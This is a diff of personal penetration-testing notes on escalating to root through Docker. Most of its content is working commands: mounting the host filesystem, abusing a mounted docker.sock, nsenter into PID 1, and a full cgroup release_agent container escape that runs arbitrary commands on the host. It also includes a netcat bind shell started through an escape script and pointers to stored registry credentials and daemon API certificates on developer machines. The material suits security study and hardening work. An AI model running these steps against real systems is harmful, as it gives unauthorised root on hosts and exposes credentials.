@@ -1,13 +1,12 @@
 Privesc with Docker access
 
-	With docker group access, root should be straightforward
+	In a container running as user with docker group access
 		create priv container (see ii. Gaining Access)
-			privileged containers can be used to gain rights on underlying host
-				mount host filesystems into a container - can be used to modify system files
+		
+		mount host filesystems into a container - can be used to modify system files
+			docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-	Containers running as privileged
-		enables all access to all devices on the host
-
+	In a container running as privileged
 		mount host filesystem into container
 			docker run -it --privileged <image_name> /bin/sh
 			mount 		(find underlying host disk path)
@@ -22,15 +21,62 @@ Privesc with Docker access
 				touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 				$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 			use script to execute a payload (e.g. netcat listener shell)
-				./escape.sh "apt install nmap -y; ncat -l 9999 -e /bin/bash"
+				./escape.sh "apt install ncat -y; ncat -l 9999 -e /bin/bash"
 
-	Docker.sock mounted into container
-		typically done for monitoring and container management
-		dangerous to effectively access docker.sock as root
-
-		gain root on host:
+	Get root on a host from a host user with docker group access
+		Mount Docker.sock into a container
 			docker run -it -v /var/run/docker.sock:/var/run/docker.sock <image_name> /bin/ash
-			within run container:
-				docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host <image_name> chroot /host
-					this container now acts effectively as root on the host
+		mount host filesystems into a container - can be used to modify system files
+			docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host <image_name> chroot /host
 
+	Get root on a host from a root user on a container
+		Execute shell in PID 1 namespace
+			nsenter --target 1 --mount sh
+
+
+	Execute arbitrary code on host from a privileged container with sys_admin capability
+		reqs: 	running as root inside the container
+				container must have SYS_ADMIN capability
+				no AppArmor profile, or otherwise allow the mount syscall
+				cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+		Creates a release_agent file and triggers release_agent invocation by killing all processes in the cgroup (by mounting cgroup controller and creating a child cgroup)
+
+		Create /tmp/cgrp directory, mount the RDMA cgroup controller, create child cgroup ("x")
+			mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+			NOTE: if you get "mount: /tmp/cgrp: special device cgroup does not exist"
+				change "rdma" to "memory"
+
+		Enable cgroup notifications on release of "x" cgroup by writing "1" to its notify_on_release file
+			echo 1 > /tmp/cgrp/x/notify_on_release
+
+		Find out where the containers files are stored on the host and store it as a variable
+		    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+		Add the exploit file path to the release_agent file (executed by "cgroup" once released)
+		    echo "$host_path/exploit" > /tmp/cgrp/release_agent
+
+		Exploit is an SH script
+		    echo '#!/bin/sh' > /exploit
+
+		Exploit script executes provided command(s), once cgroup release triggers script execution
+		    echo "<command to execute> > $host_path/output" >> /exploit
+
+		Make exploit script executable
+		    chmod a+x /exploit
+
+		Create a process inside "x" cgroup child, which immediately ends to trigger exploit
+		    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+		Output of script command(s) will be in the /output file in the container
+
+
+
+
+Copy from/to container
+  	 cp <container_name>:/<container_path> ./
+
+publishing images to Docker Hub requires docker login
+	stores creds in $HOME/.docker/config.json
+
+look for Docker Daemon API certs in .docker folder of dev machines
